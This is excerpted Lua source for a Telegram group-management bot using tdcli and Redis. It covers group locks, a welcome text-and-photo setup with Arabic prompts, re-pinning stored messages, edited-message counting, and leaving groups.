DevRio:set(SAKO.."Rio:Lock:Bots"..Groups[i],"del") DevRio:hset(SAKO.."Rio:Spam:Group:User"..Groups[i] ,"Spam:User","keed") 
...
for i,Lock in pairs(LockList) do
DevRio:set(SAKO..Lock..Groups[i],true)
end
end
...
DevRio:del(SAKO..'Rio:Text:BotWelcome')
DevRio:del(SAKO..'Rio:Photo:BotWelcome')
return false
end 
...
DevRio:del(SAKO..'Rio:Lock:BotWelcome')
return false
end 
...
DevRio:set(SAKO..'Rio:Lock:BotWelcome',true)
return false
end 
...
DevRio:del(SAKO..'Rio:Text:BotWelcome')
DevRio:del(SAKO..'Rio:Photo:BotWelcome')
DevRio:set(SAKO.."Rio:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevRio:get(SAKO.."Rio:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, "md") 
DevRio:del(SAKO.."Rio:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ النص ارسل لي صورة الترحيب\n᥀︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
DevRio:set(SAKO.."Rio:Text:BotWelcome",text) 
DevRio:set(SAKO.."Rio:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevRio:get(SAKO.."Rio:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
...
DevRio:set(SAKO.."Rio:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
...
DevRio:setex(SAKO.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
end end
...
DevRio:del(SAKO.."DevText")
end end
--     Source SAKO     --
if DevRio:get(SAKO.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, "md") 
DevRio:del(SAKO.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del(SAKO.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevRio:set(SAKO..'Rio:ChText',texxt)
...
DevRio:setex(SAKO.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)   
...
DevRio:incr(SAKO..'Rio:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevRio:get(SAKO..'Rio:Lock:EditMsgs'..msg.chat_id_) and not Text and not RioConstructor(result) then
...
local GetMsgPin = DevRio:get(SAKO..'Rio:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevRio:del(SAKO..'Rio:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevRio:del(SAKO..'Rio:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
...
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=SAKO,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
DevRio:srem(SAKO..'Rio:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevRio:srem(SAKO..'Rio:Groups',v)  
end
